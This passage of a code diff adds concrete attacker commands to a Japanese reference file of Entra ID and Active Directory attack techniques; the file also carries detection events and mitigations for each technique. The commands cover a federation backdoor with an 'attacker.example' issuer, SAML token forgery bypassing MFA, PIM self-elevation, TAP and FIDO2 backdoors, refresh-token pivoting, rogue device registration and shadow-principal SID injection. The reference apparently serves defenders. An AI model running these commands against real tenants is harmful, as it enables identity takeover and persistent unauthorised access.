     "mitigate": "(1) Application/Cloud Application Administrator と Global Administrator の割り当てを最小化しPIMで時間制限付き昇格に。(2) アプリの所有者(owner)を定期棚卸しし、不要な所有権を剥奪。(3) アプリ資格情報をシークレット禁止・証明書のみ、または Managed Identity / Workload Identity Federation(OIDC)へ移行しシークレット自体を排除。(4) Application管理者による資格情報追加をワークフロー承認(Entitlement Management/PIM承認)に載せる。(5) Conditional Access のワークロードID条件でSPサインインを既知IPに制限。(6) 監査ログをSIEMに転送し「Add service principal credentials」を高優先アラート化、AzureHound列挙(大量Graphディレクトリ読取)も検知。(7) 過剰なアプリケーション権限(RoleManagement.ReadWrite.Directory, Application.ReadWrite.All, Mail.Read全体)を棚卸し・削減。",
@@ -8872,6 +14561,28 @@ AD.I18N.ja.attacks = [
     "summary": "Entraテナントで特権を握った攻撃者が、管理対象(Managed)ドメインをフェデレーション(Federated)化し、攻撃者が支配するIssuerURIとトークン署名証明書を登録するバックドア。以後、任意ユーザーのSAMLトークンを偽造し、パスワードもMFAも不要で誰にでもなりすませる、テナント全体を制圧する信頼関係の恒久的侵害である。",
     "how": "前提権限: フェデレーション設定を変更できるEntraロール(Global Administrator, Security Administrator, Hybrid Identity Administrator, External Identity Provider Administrator, Domain Name Administrator, Partner Tier2 Support のいずれか)と検証済みドメインが1つ以上必要。主要プリミティブは2系統。(A) Managed→Federated変換型: 対象ドメインをManagedからFederatedへ変換し、IssuerUriとトークン署名証明書を攻撃者管理値に設定してEntraが攻撃者署名SAMLトークンを信頼する状態を作る。(B) 二次署名証明書型(よりステルス): 既にFederatedなドメインへ nextSigningCertificate として攻撃者証明書を追加する。Entraは主/次の両署名証明書を同時に受理するため正規認証を壊さず潜伏でき、認証タイプが変わらないため「Set domain authentication」は発火せず「Set federation settings on domain」のみ残る。手順: (1) AADInternals `ConvertTo-AADIntBackdoor -DomainName contoso.com`(v0.9.3+はドメインが既にFederatedなら自動で二次証明書として注入)、またはGraph `New-MgDomainFederationConfiguration` / `Update-MgDomainFederationConfiguration -NextSigningCertificate <b64>`。※MSOnlineの `Set-MsolDomainAuthentication` / `Set-MsolDomainFederationSettings` は2025年に廃止(retired)され現行テナントでは機能しないため、現在の実行経路はGraphまたはAADInternalsが中心。(2) 標的のimmutableID(objectGUID/ms-DS-ConsistencyGuidのBase64)を `Get-AADIntUsers` 等で取得。(3) `Open-AADIntOffice365Portal -ImmutableID <id> -Issuer <issuer> -UseBuiltInCertificate -ByPassMFA $true` でSAMLトークンを偽造しサインイン。フェデレーション設定と署名証明書が残る限り恒久的に持続する。\n\n※到達経路に関する2025年の変化: 本バックドア(add/convert-domain → issuerUri+ImmutableID+SHA256ハッシュで任意ユーザーのトークンを偽造)は、フェデレーション設定を変更できる権限を攻撃者が既に握っている場合には現在も有効。ただしその地位へ到達する著名な第一者アプリ/トークン経路のうち2つは2025年に塞がれた。(a) Datadogの「I SPy」エスカレーション ― Office 365 Exchange Onlineの第一者サービスプリンシパル(00000002-0000-0ff1-ce00-000000000000)を悪用してSAML/MFAクレームを偽造しGlobal Adminへ昇格する手法 ― は2025年8月にMicrosoftが修正済みで、当該SP向けのMicrosoft Graphトークン取得は現在エラーになる(Datadogが2025年8月7日に悪用不可を確認)。(b) Actorトークン悪用(CVE-2025-55241: ACS発行のS2S Actorトークン+レガシーAzure AD Graph(graph.windows.net)のテナント検証不備を組み合わせたクロステナントGlobal Admin偽装、Dirk-jan Mollema報告、CVSS 10.0(Microsoft)/9.8(NVD))はMicrosoftが2025年7月17日に本番修正し8月6日に追加のActorトークン遮断緩和を展開済み(CVE採番・一般公開は2025年9月)。一方、MSRCはサービスプリンシパルへ Application Administrator ロールを直接割り当てて資格情報を発行する行為自体は「想定内の動作(expected behavior)」であり脆弱性ではないとの立場を維持しているため、SPへの高権限アプリロール付与はプラットフォーム側では防がれず防御側が独自に監視する必要がある。",
     "tools": "AADInternals (ConvertTo-AADIntBackdoor, Open-AADIntOffice365Portal, Get-AADIntUsers), MSOnline (Set-MsolDomainAuthentication), Microsoft Graph PowerShell (New-MgDomainFederationConfiguration/Update-MgDomainFederationConfiguration), PowerShell",
+    "cmd": [
+      {
+        "tool": "AADInternals",
+        "t": "ドメインをManaged→Federatedへ変換し攻撃者証明書のIssuerを設定。既にFederatedならv0.9.3+で自動的に二次署名証明書として注入される",
+        "q": "ConvertTo-AADIntBackdoor -DomainName corp.com"
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "Graph経由での同等操作。監査ログに`Set federation settings on domain`として残る",
+        "q": "New-MgDomainFederationConfiguration -DomainId \"corp.com\" -IssuerUri \"http://attacker.example/adfs/services/trust/\" -SigningCertificate \"MIIC3jCC...\" -PassiveSignInUri \"https://attacker.example/adfs/ls/\" -ActiveSignInUri \"https://attacker.example/adfs/services/trust/2005/usernamemixed\""
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "既にFederatedなドメインへ二次署名証明書のみ追加するステルス版。認証方式が変わらないため`Set domain authentication`は発火しない",
+        "q": "Update-MgDomainFederationConfiguration -DomainId \"corp.com\" -InternalDomainFederationId <id> -NextSigningCertificate \"MIIC3jCC...\""
+      },
+      {
+        "tool": "AADInternals",
+        "t": "偽装Issuerとimmutable IDで任意ユーザーのSAMLトークンを偽造しMFA無しでサインイン。Office365ポータルへの単発サインインとして残る",
+        "q": "Open-AADIntOffice365Portal -ImmutableID <id> -Issuer \"http://attacker.example/adfs/services/trust/\" -UseBuiltInCertificate -ByPassMFA $true"
+      }
+    ],
     "detect": "主信号はEntra監査ログ(AuditLogs): OperationName \"Set domain authentication\" と \"Set federation settings on domain\"。変換型では両者が同一アクター/ドメインで短時間に連続発生しドメインが Managed→Federated へ変化するが、二次署名証明書型では認証タイプが変わらず \"Set domain authentication\" は発火せず \"Set federation settings on domain\" 単独となるため、Managed→Federated遷移だけを引き金にすると取り逃す。重要な盲点として、\"Set federation settings on domain\" イベントは変更後のトークン署名証明書やnextSigningCertificateの中身を含まないため、監査イベント単体では悪性判定できない。対策として相関ID(correlationId)で両イベントを結び、変更検知時に Get-MgDomainFederationConfiguration で全フェデレーションドメインの issuerUri / signingCertificate / nextSigningCertificate を取得しベースラインと差分照合する運用を必須化する。異常兆候: 未知のIssuerUri(例: http://any.sts/... はAADInternalsの既定)、想定外の二次署名証明書の出現、既存ADFSと無関係な新規フェデレーションドメイン。フェデレーション化後にサインインが federated 認証へ切替わる点をSigninLogs/EntraIdSignInEventsで監視。攻撃者ホスト側ではPowerShellスクリプトブロックログ(4104)にAADInternalsのcmdlet、provisioningapi/adminwebservice.microsoftonline.com・graph.windows.net への通信が残る。テレメトリ源: Entra Audit Logs, SigninLogs/EntraIdSignInEvents, Defender for Cloud Apps(CloudAppEvents), 端末のPowerShellログ/EDR。",
     "events": "Entra Audit: Set domain authentication(変換型のみ発火) / Set federation settings on domain(両型で発火・二次署名証明書型はこれ単独) (DomainManagement); 4104(AADInternalsスクリプトブロック), 4103(モジュールログ), 4688(powershell.exe) ※監査イベントは署名証明書の中身を含まない",
     "mitigate": "(1) ドメインフェデレーションを管理できるロール(Global Admin, Hybrid Identity Admin)を最小化しPIM/JITで昇格制御、フィッシング耐性MFAを必須化。(2) `Set domain authentication`/`Set federation settings on domain` 監査イベントに即時アラートを設定し、未承認のフェデレーションドメイン追加を検知。(3) 偽造SAMLによるMFAバイパスを封じるため、フェデレーションドメインの `federatedIdpMfaBehavior` を `rejectMfaByFederatedIdp` に設定しEntra側でMFAを強制。(4) 全フェデレーションドメインのIssuerUri・トークン署名証明書・PassiveLogOnUriを棚卸しし、未知値を排除。(5) レガシーな MSOnline/Azure AD Graph モジュールの利用を制限・監視、条件付きアクセスで管理操作を保護。(6) 本バックドアの地位へ到達する第一者アプリ/トークン経路のうち、Datadog「I SPy」(Office 365 Exchange Online SP 00000002-0000-0ff1-ce00-000000000000 の悪用)は2025年8月、Actorトークン(CVE-2025-55241)はMicrosoftが2025年7月に修正・8月に追加緩和済み(CVE採番・公開は2025年9月)であり、当該テナントがこれらの修正を受領していることを確認する。ただしサービスプリンシパルへの Application Administrator / Cloud Application Administrator 等の高権限アプリロール直接付与はMSRCが『想定内の動作』とみなしプラットフォーム側では防がれないため、SPへの特権アプリロール付与・SP資格情報(パスワード/証明書)の追加を監査ログ(Add service principal credentials, Add app role assignment to service principal)で継続監視し、未承認のものはフェデレーション改ざんの前段として扱う。",
@@ -8917,6 +14628,33 @@ AD.I18N.ja.attacks = [
     "summary": "Entra IDで侵害した中特権アカウントやサービスプリンシパルから、PIMの適格(eligible)ロールを自己アクティブ化したり、自身をGlobal Administrator等の特権ディレクトリロールに直接割り当てたりしてテナント全体を掌握する権限昇格・永続化手法。",
     "how": "前提として、RoleManagement.ReadWrite.Directory を持つアプリ/SP、Privileged Role Administrator/Global Administrator への適格(eligible)割当、またはロール割当を書き込める中特権アカウントのトークンが必要。手順: (1) 盗んだ資格情報/更新トークン/デバイスコードで Connect-MgGraph または az login。(2) PIM適格ロールがあれば New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -Action selfActivate で Global Admin を JIT アクティブ化(承認/MFAが未強制なら即時)。(3) 割当権限があれば New-MgRoleManagementDirectoryRoleAssignment(-Action adminAssign) で自アカウントを特権ロールに恒久割当。(4) 永続化として Update-MgPolicyRoleManagementPolicyRule で PIM の承認・MFA要件を無効化、または新規/既存SPに Add-MgServicePrincipalAppRoleAssignment・資格情報(パスワード/証明書)追加でバックドア化。主要プリミティブは Microsoft Graph の roleManagement / roleAssignmentScheduleRequests API。なお az role assignment create は Azure RBAC(サブスクリプション)側であり、Entraディレクトリロールの直接付与は Graph roleManagement を用いる点に注意。",
     "tools": "Microsoft Graph PowerShell SDK (New-MgRoleManagementDirectoryRoleAssignment*, Update-MgPolicyRoleManagementPolicyRule), Azure CLI (az role assignment create — Azure RBAC), AzureAD/AzureADPreview, ROADtools (roadrecon), GraphRunner, TokenTactics, MicroBurst, PowerZure",
+    "cmd": [
+      {
+        "tool": "Graph PowerShell",
+        "t": "PIM適格ロールを自己アクティブ化。`action:selfActivate`がunifiedRoleAssignmentScheduleRequestの監査証跡に残る",
+        "q": "New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -Action SelfActivate -PrincipalId <objectId> -RoleDefinitionId 62e90394-69f5-4237-9190-012177145e10 -DirectoryScopeId \"/\" -Justification \"break-glass\""
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "割当権限がある場合は適格を経由せず自アカウントへ`action:adminAssign`で恒久的に直接割当",
+        "q": "New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -Action AdminAssign -PrincipalId <objectId> -RoleDefinitionId 62e90394-69f5-4237-9190-012177145e10 -DirectoryScopeId \"/\""
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "昇格後の永続化として自SPへ資格情報を追加しバックドア化。技術231と同一のaddPasswordプリミティブ",
+        "q": "Add-MgServicePrincipalPassword -ServicePrincipalId <spObjectId> -PasswordCredential @{DisplayName='pim-backdoor'}"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "Azure RBAC(サブスクリプション)側の割当でEntraディレクトリロールとは別経路。混同すると誤って検知対象から漏れる",
+        "q": "az role assignment create --assignee <objectId> --role \"Owner\" --scope /subscriptions/<subId>"
+      },
+      {
+        "tool": "roadrecon",
+        "t": "PIM適格ロールや危険な直接割当を持つプリンシパルを事前列挙",
+        "q": "roadrecon auth -u svc_user@corp.onmicrosoft.com -p 'Passw0rd!'\nroadrecon gather"
+      }
+    ],
     "detect": "テレメトリは Entra ID ディレクトリ監査ログ(AuditLogs)と PIM 監査が主。特権ロール(\\\"Add member to role\\\"/\\\"Add member to role completed (PIM activation)\\\"/\\\"Add eligible member to role\\\")への追加、PIMポリシー改ざん(\\\"Update role setting in PIM\\\")、SP資格情報追加(\\\"Add service principal credentials\\\")を監視する。相関の鍵は、直前のサインイン(SigninLogs/EntraIdSignInEvents)のリスクレベル・ClientApp(Graph PowerShell/デバイスコード)・非管理端末IP・Conditional Access未充足。Defender XDR の CloudAppEvents(ActionType \\\"Add member to role.\\\")も同信号を運ぶ。承認なしの自己アクティブ化や業務時間外の特権付与を異常として検知する。エンドポイントEDR(MDE デバイステーブル/CrowdStrike)はディレクトリ変更自体を観測しないため、攻撃者端末での Graph/az コマンド実行が唯一のホスト側手掛かり。",
     "events": "Entra監査(AuditLogs OperationName): Add member to role(特権ロール付与), Add member to role completed (PIM activation)(PIM昇格), Add eligible member to role(適格割当付与), Update role setting in PIM(PIMポリシー改ざん), Add service principal credentials(SP資格情報追加=永続化); SigninLogs/EntraIdSignInEvents(特権操作直前のサインイン相関)。※これらはクラウド監査イベントであり Windows Security の数値EventIDは発生しない。",
     "mitigate": "PIMは全特権ロールで承認+MFA+時間制限を必須化し、恒久的なGlobal Admin割当を排除。Global Admin/Privileged Role Administrator の割当・PIMポリシー変更に Conditional Access(フィッシング耐性MFA・準拠デバイス)を強制。RoleManagement.ReadWrite.Directory 等の高権限アプリ権限を棚卸し・削減し、SP資格情報の追加を管理者承認とアラートで制限。緊急アクセス(Break-glass)アカウントを分離監視し、特権ロール変更をリアルタイムアラート化する。",
@@ -8962,6 +14700,28 @@ AD.I18N.ja.attacks = [
     "summary": "攻撃者が Entra ID の認証方法（FIDO2 キー、電話/Microsoft Authenticator、Temporary Access Pass 等）を被害者アカウントに追加・改変し、MFA を回避しながらパスワードに依存しない永続的なアカウント制御を確立する手法。",
     "how": "前提権限: 他ユーザーへ方法を登録するには Authentication Administrator / Privileged Authentication Administrator / Global Administrator のいずれか。TAP を発行するには加えて Authentication Policy Administrator が TAP ポリシーを有効化している必要がある。自分自身のアカウントなら、フィッシング等で奪取したセッション/一次リフレッシュトークンだけで新規メソッドを登録可能（弱い MFA 登録を突く）。手順: (1) 被害者/管理者のトークンを取得（TokenTactics, AADInternals, デバイスコードフィッシング）。(2) Microsoft Graph へ直接呼び出し — POST /users/{id}/authentication/temporaryAccessPassMethods で TAP 発行、POST /fido2Methods・/phoneMethods・/microsoftAuthenticatorMethods でバックドア用メソッド追加。(3) ツール: Microsoft Graph PowerShell の New-MgUserAuthenticationTemporaryAccessPassMethod、AADInternals の New-AADIntTAP / Set-AADIntUserMFA、GraphRunner。主要プリミティブ: TAP は時間制限付きパスコードで単独で MFA を満たすため、パスワードを知らずにサインインでき、FIDO2/電話の追加は将来にわたる恒久的な MFA バックドアとなる。実行の大半は攻撃者ホストの PowerShell/CLI から Graph API 経由で行われ、ドメイン内の痕跡は残さない。",
     "tools": "Microsoft Graph PowerShell (Microsoft.Graph.Identity.Signins), AADInternals, TokenTactics, GraphRunner, ROADtools, Azure CLI, Entra 管理ポータル, Microsoft Graph API",
+    "cmd": [
+      {
+        "tool": "Graph PowerShell",
+        "t": "被害者/管理者アカウントにTemporary Access Passを発行。単体でMFAを満たすためパスワード不要でサインインできる",
+        "q": "New-MgUserAuthenticationTemporaryAccessPassMethod -UserId <objectId> -BodyParameter @{lifetimeInMinutes=60; isUsableOnce=$false}"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "同等操作をAADInternals単体で実行しTAPを発行",
+        "q": "New-AADIntUserTAP -AccessToken $at -UserPrincipalName victim@corp.onmicrosoft.com -LifetimeInMinutes 60"
+      },
+      {
+        "tool": "TokenTactics",
+        "t": "奪取したリフレッシュトークンでMSGraphアクセストークンへ更新し、その文脈でFIDO2/電話番号のバックドア用認証方法を追加する",
+        "q": "Invoke-RefreshToMSGraphToken -domain corp.onmicrosoft.com -ClientId 1b730954-1685-4b74-9bfd-dac224a7b894 -refreshToken 0.AXo..."
+      },
+      {
+        "tool": "Graph API",
+        "t": "FIDO2キーを直接追加する生API呼び出し。ユーザーの認証方法一覧に永続的なキーが追加されaddedByが操作者アカウントとして残る",
+        "q": "Invoke-RestMethod -Method POST -Uri \"https://graph.microsoft.com/v1.0/users/<userId>/authentication/fido2Methods\" -Headers @{Authorization=\"Bearer $token\"} -Body $fido2PublicKeyCredential"
+      }
+    ],
     "detect": "検知の主戦場は Entra 監査ログ（クラウド）。シグナル: 「Admin registered security info」「Admin created Temporary Access Pass」など、開始者(InitiatedBy)と対象(TargetResources)が異なる管理者による他人アカウントへの登録、見慣れない IP/ASN/地理からの登録、TAP 作成直後の同一/別 IP からのサインイン成功、短時間での複数対象への TAP 大量発行。テレメトリ: AuditLogs（Category=UserManagement/Authentication Methods）、SigninLogs / EntraIdSignInEvents（新メソッドで MFA を満たしたサインイン）、CloudAppEvents（Microsoft Graph アクティビティ）。ホスト側では攻撃者端末の PowerShell/CLI で Graph の authentication/methods・temporaryAccessPass 呼び出しを含むコマンドライン。MDE/MDI はエンドポイント兆候の補助であり、クラウド監査ログが権威情報源。",
     "events": "Entra Audit: 'Admin registered security info'(管理者が他人へ登録), 'User registered security info'(本人登録), 'Admin updated security info', 'Admin created Temporary Access Pass'(TAP作成), 'User started security info registration'; AuditLogs Category=UserManagement/Authentication Methods; SigninLogs authenticationMethod='Temporary Access Pass'(TAPでサインイン) — ※クラウドイベントのみ発火、対応するWindows Event IDは無し",
     "mitigate": "Authentication Administrator / Privileged Authentication Administrator の割り当てを最小化し PIM/JIT と承認フローで昇格を制限。TAP ポリシーは無効化するか、一回限り・短寿命・限定グループにスコープ。フィッシング耐性 MFA（FIDO2/証明書）を管理者に必須化し初期トークン窃取を防止。条件付きアクセスでセキュリティ情報登録に準拠デバイス/信頼された場所/再認証を要求。開始者≠対象の認証方法登録と TAP 発行にアラートを設定。「不審なアクティビティを報告」を有効化。登録済み認証方法を定期棚卸しし、不要・不審なメソッドを削除。",
@@ -9007,6 +14767,33 @@ AD.I18N.ja.attacks = [
     "summary": "FOCI（Family of Client IDs）は、Microsoft第一者アプリ群が共通の「ファミリー」リフレッシュトークンを共有する仕様を悪用し、1つの第一者アプリ（例: Officeクライアント）向けに窃取したリフレッシュトークンを、トークンエンドポイントで別のファミリーアプリ（例: Azure CLI/Teams）のclient_idに交換してアクセスを横展開する手法で、アプリ単位の条件付きアクセスやMFA再要求を回避できる点が脅威となる。",
     "how": "前提: 攻撃者はFOCIファミリーの第一者アプリ向けリフレッシュトークン(RT)を1つ入手済み（管理者権限は不要）。入手経路はデバイスコードフィッシング、AITMフィッシング、または侵害ホストからのトークンキャッシュ窃取（%LOCALAPPDATA%\\Microsoft\\TokenBrokerのWAM/.tbres、Azure CLIのmsal_token_cache.bin、Edge/Chromeのトークン等）。手順: (1) TokenTactics/roadtx/AADInternalsでRTを取得または読み出し。(2) https://login.microsoftonline.com/common/oauth2/v2.0/token へ POST し grant_type=refresh_token, refresh_token=<窃取RT>, client_id=<別ファミリーapp, 例 04b07795-8ddb-461a-bbee-02f9e1bf7b46(Azure CLI)>, scope=<対象リソース>/.default を指定。応答にファミリー共有RT(foci=1)が含まれるため、新しいclient_id/リソース向けのアクセストークン＋新RTが発行される。例: roadtx gettokens --refresh-token <RT> -c azcli -r msgraph、あるいは PowerShellのInvoke-RefreshToMSGraphToken/Invoke-RefreshToAzureManagementToken。(3) 発行されたATでMicrosoft Graph/Azure Resource Manager/Exchange Onlineへアクセスし、条件付きアクセスがアプリ単位でしか掛かっていなければ回避して横展開。中核プリミティブ = ファミリー共有RTのclient_id交換によるリソース/アプリ横断のトークン再発行。",
     "tools": "TokenTactics / TokenTacticsV2, roadtx (ROADtools), AADInternals (Get-AADIntAccessTokenFor*), 生のcurl/PowerShell(Invoke-RestMethod)によるトークンエンドポイントPOST",
+    "cmd": [
+      {
+        "tool": "TokenTactics",
+        "t": "窃取した第一者アプリのRTをARM向けに交換。アプリ単位のCA/MFAはこの交換自体では発火しない",
+        "q": "Invoke-RefreshToAzureManagementToken -domain corp.onmicrosoft.com -refreshToken $response.refresh_token"
+      },
+      {
+        "tool": "TokenTactics",
+        "t": "同じRTをGraph向けに再交換。直前と異なるappId/clientAppUsedがSigninLogsに短時間で連続する点が指紋",
+        "q": "Invoke-RefreshToMSGraphToken -domain corp.onmicrosoft.com -refreshToken $response.refresh_token"
+      },
+      {
+        "tool": "roadtx",
+        "t": "ROADtoolsでのFOCIピボット。`-c azcli`はAzure CLIのclient_id固定でaz cliへのなりすましサインインに見える",
+        "q": "roadtx refreshtokento -c azcli -r msgraph --refresh-token $RT"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "ファミリー共有RTをAzure Core管理API向けに交換。`-SaveToCache`実行がローカルのトークンキャッシュファイルI/Oとして残る",
+        "q": "Get-AADIntAccessTokenForAzureCoreManagement -RefreshToken $RT -SaveToCache"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "ツール無しの素のトークンエンドポイントPOST。同一RTが複数client_idで短時間に使われる連続性がFOCI濫用の裏付け",
+        "q": "Invoke-RestMethod -Uri 'https://login.microsoftonline.com/common/oauth2/v2.0/token' -Method Post -Body @{grant_type='refresh_token';client_id='04b07795-8ddb-461a-bbee-02f9e1bf7b46';refresh_token=$RT;scope='https://graph.microsoft.com/.default'}"
+      }
+    ],
     "detect": "クラウド側が主要テレメトリ。Entra ID サインインログ（特に非対話型/Non-interactive sign-ins）で、同一ユーザー・同一IPから短時間に複数の第一者AppId（Office→Azure CLI→Teams等）へのトークン発行が連続する「ファミリー横断」パターンを検知する。補助信号: python-requests等の異常User-Agent/ClientAppUsed、データセンター/VPN IP、対話認証イベントを伴わないRT交換、リスクレベル(不可能な移動)、resourceDisplayNameの急な変化。エンドポイント側では窃取ツール実行（roadtx/TokenTactics/AADInternals）のプロセス生成、およびトークンキャッシュファイル(.tbres/msal_token_cache.bin)の読み取りアクセス。テレメトリ源: EntraIdSignInEvents/SigninLogs(非対話型)、AADInternals検出、Defender for Endpoint プロセス/ファイルイベント、Identity Protection リスク検出。",
     "events": "Entra Non-Interactive SignIn(複数first-party AppId横断), EntraIdSignInEvents(ClientAppUsed異常), 4688(roadtx/TokenTactics/AADInternals実行:窃取ホスト), 4663(トークンキャッシュ.tbres/msal_token_cache.bin読取:要SACL) ※トークン再発行自体はWindows Event/4768等を生成しない",
     "mitigate": "(1) 条件付きアクセスを「すべてのクラウドアプリ」に適用し、アプリ単位の穴を塞ぐ（FOCIは別アプリへ交換して回避するため）。(2) トークン保護(Token Protection/token binding)でトークンをデバイスにバインドし窃取RTの再生を無効化。(3) 継続的アクセス評価(CAE)を有効化し、失効・リスクをほぼ即時反映。(4) 侵害時は revokeSignInSessions でRTを一括失効。(5) デバイスコードフローをCAで制限/ブロック。(6) サインイン頻度を短縮しRT寿命を短縮。(7) フィッシング耐性MFA(FIDO2/証明書)とマネージド/準拠デバイス必須化。(8) Identity Protectionのリスクベースポリシーで異常サインインを自動ブロック。",
@@ -9052,6 +14839,38 @@ AD.I18N.ja.attacks = [
     "summary": "盗んだユーザー資格情報や BPRT(一括登録トークン)を用いて Entra ID に不正なデバイスを登録し、そのデバイスの Primary Refresh Token(PRT)を取得して全クラウドアプリへの SSO とデバイス状態ベースの条件付きアクセスを迂回する、ハイブリッド/クラウド特有の永続化・横展開手法。",
     "how": "前提: テナント内の有効なユーザー資格情報(またはトークン)と、既定の「ユーザーはデバイスを登録/参加できる = すべて」かつ「登録/参加時に MFA を要求しない」設定。手順: (1) AADInternals で `Get-AADIntAccessTokenForAADJoin`(Authentication Broker, clientID 29d9ed98-…)を取得。(2) 単発なら `Join-AADIntDeviceToAzureAD -DeviceName \"Rogue\" -DeviceType Windows` でデバイス証明書+トランスポートキーを生成し Entra に登録。(3) `Get-AADIntUserPRTToken` / `Get-AADIntUserPRTKeys` で PRT を要求。BPRT 版: `New-AADIntBulkPRTToken -Name \"pkg\"` で package_<guid> 疑似ユーザーの一括登録トークン(MFA 不要・180日有効)を発行し、`Join-AADIntDeviceToAzureAD -BPRT $bprt` を反復して大量の登録済みデバイスを量産。roadtx(ROADtools)でも `roadtx device -a register` / `roadtx prt` で同等。鍵となる一次成果物は PRT + セッションキーで、これにより任意クラウドアプリのアクセストークンを発行でき、「デバイス登録済み/参加済み」状態を要求する CA を満たす永続的な足場となる。",
     "tools": "AADInternals (Join-AADIntDeviceToAzureAD, New-AADIntBulkPRTToken, Get-AADIntUserPRTToken), ROADtools/roadtx, TokenTactics, dsregcmd.exe, Windows Configuration Designer (WCD)",
+    "cmd": [
+      {
+        "tool": "AADInternals",
+        "t": "デバイス登録用トークンを取得。以降のJoin/BPRT操作すべての起点でトークンキャッシュに保存される",
+        "q": "Get-AADIntAccessTokenForAADJoin -SaveToCache"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "不正デバイスをEntraに登録しPRT発行の土台となる証明書を生成。AuditLogsに`Add device`が記録される",
+        "q": "Join-AADIntDeviceToAzureAD -DeviceName \"Rogue-PC\" -DeviceType Windows -OSVersion \"10.0.19045\""
+      },
+      {
+        "tool": "AADInternals",
+        "t": "MFA不要・最長180日有効のBPRTを発行しpackage_<guid>疑似ユーザーを作成。大量デバイス登録の永続化基盤になる",
+        "q": "New-AADIntBulkPRTToken -Name \"pkg_svc\""
+      },
+      {
+        "tool": "AADInternals",
+        "t": "発行済みBPRTでデバイス登録トークンを取得しJoinをループさせれば登録済み端末を量産できる",
+        "q": "Get-AADIntAccessTokenForAADJoin -BPRT $bprt -SaveToCache"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "デバイス証明書からPRTキーを抽出。`-PfxFileName`が対象端末上のPFXファイルアクセスとして残る",
+        "q": "Get-AADIntUserPRTKeys -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -Credentials $cred"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "抽出キーからPRT JWTを再構築しSSOトークンとして悪用。正規デバイスのPRTと区別が困難な永続化になる",
+        "q": "New-AADIntUserPRTToken -RefreshToken $prtKeys.refresh_token -SessionKey $prtKeys.session_key"
+      }
+    ],
     "detect": "主シグナルはクラウド側テレメトリ。Entra 監査ログの「Add device」「Add registered owner to device」が短時間に同一ユーザー/IPから多数発生。サインインログでの Device Registration Service / Microsoft Authentication Broker への認証、特に見知らぬ IP・国・非管理クライアントから。package_<guid> 疑似ユーザーの出現とその BPRT サインイン。Intune 登録(MDM)を伴わない「登録済みのみ」のデバイス増加。PRT 取得後に多数のクラウドアプリへ短時間でトークン発行される SSO パターン。攻撃が管理端末上で実行された場合は dsregcmd.exe/powershell.exe/python(roadtx) の実行と enterpriseregistration.windows.net への接続。",
     "events": "AuditLogs: Add device / Add registered owner to device / Update device (Category: Device), SigninLogs: Device Registration Service / Microsoft Authentication Broker サインイン, 4688(攻撃/管理ホストの dsregcmd.exe・powershell.exe・python/roadtx)",
     "mitigate": "Entra のデバイス設定で「ユーザーはデバイスを Entra に参加/登録できる」を特定グループに限定し、「デバイスの参加/登録に MFA を要求」を有効化(MFA を持たない BPRT 発行と大半の不正登録を遮断)。ユーザーあたりのデバイス最大数を縮小。条件付きアクセスは「登録済み」ではなく Intune 準拠(compliant)/ハイブリッド参加を要求し、不正登録デバイスを排除。定期的に登録済みデバイスと package_<guid> ユーザーを棚卸しし不審オブジェクトを削除、BPRT の失効。トークン保護(token protection)/フィッシング耐性 MFA で初期資格情報窃取を抑止。デバイス登録の急増を継続監視。",
@@ -9097,6 +14916,28 @@ AD.I18N.ja.attacks = [
     "summary": "MIM PAM(Privileged Access Management)向けのPIMトラストと Shadow Security Principal(msDS-ShadowPrincipal)を悪用し、バスティオン/管理フォレストのオブジェクトに本番フォレストの特権SID(Enterprise/Domain Admins 等)をマッピングして認証時にSID Historyとして注入させ、フォレスト境界を越えた特権昇格を成立させる手法。",
     "how": "前提: 本番フォレストで PAM 機能(Enable-ADOptionalFeature 'Privileged Access Management Feature')とバスティオンからの一方向 PIM トラスト(netdom trust ... /EnableSIDHistory:yes /EnablePIMTrust:yes、FFL 2016+)が有効で、攻撃者がバスティオン/MIM フォレストの CN=Shadow Principal Configuration,CN=Services,CN=Configuration コンテナへの書込権(または PAM/MIM 管理権)を保持していること。手順: (1) New-ADObject で msDS-ShadowPrincipal クラスのオブジェクトを作成し、msDS-ShadowPrincipalSid に本番の特権 SID(例 S-1-5-21-…-519 Enterprise Admins / -512 Domain Admins / -500)を設定、(2) Set-ADObject -Add @{'member'=攻撃者DN} で自身を当該シャドウプリンシパルのメンバに追加(MIM では New-PAMGroup/New-PAMUser/New-PAMRequest でも同等)、(3) 攻撃者が本番リソースへ Kerberos 認証すると、PIM トラスト経由でシャドウ SID が TGT の SID History として PAC に注入される。鍵となるプリミティブは「特権グループの sIDHistory を直接書かず、シャドウオブジェクト経由で認証時に SID を合成する」点で、対象アカウントには痕跡が残りにくい。以後 DCSync 等で本番 Tier-0 を完全掌握可能。",
     "tools": "PowerShell ActiveDirectory モジュール(New-ADObject / Set-ADObject / Enable-ADOptionalFeature), MIM PAM cmdlets(New-PAMGroup / New-PAMUser / New-PAMRequest), netdom.exe(/EnablePIMTrust), ldapmodify, Rubeus/Mimikatz(SID History 比較・PAC 検証), BloodHound(信頼関係列挙)",
+    "cmd": [
+      {
+        "tool": "netdom.exe",
+        "t": "PIMトラストが有効化されているか確認。`/EnablePIMTrust`はフォレスト間かつFFL2016+でのみ意味を持つ稀な設定で単体でも高シグナル",
+        "q": "netdom trust bastion.local /domain:prod.local /EnablePIMTrust"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "Shadow Security Principalを作成し本番の特権SIDを`msDS-ShadowPrincipalSid`に設定。この属性書込自体が強いシグナル",
+        "q": "New-ADObject -Name 'Shadow-EA' -Type 'msDS-ShadowPrincipal' -Path 'CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local' -OtherAttributes @{'msDS-ShadowPrincipalSid'='S-1-5-21-1111111111-2222222222-3333333333-519'}"
+      },
+      {
+        "tool": "PowerShell",
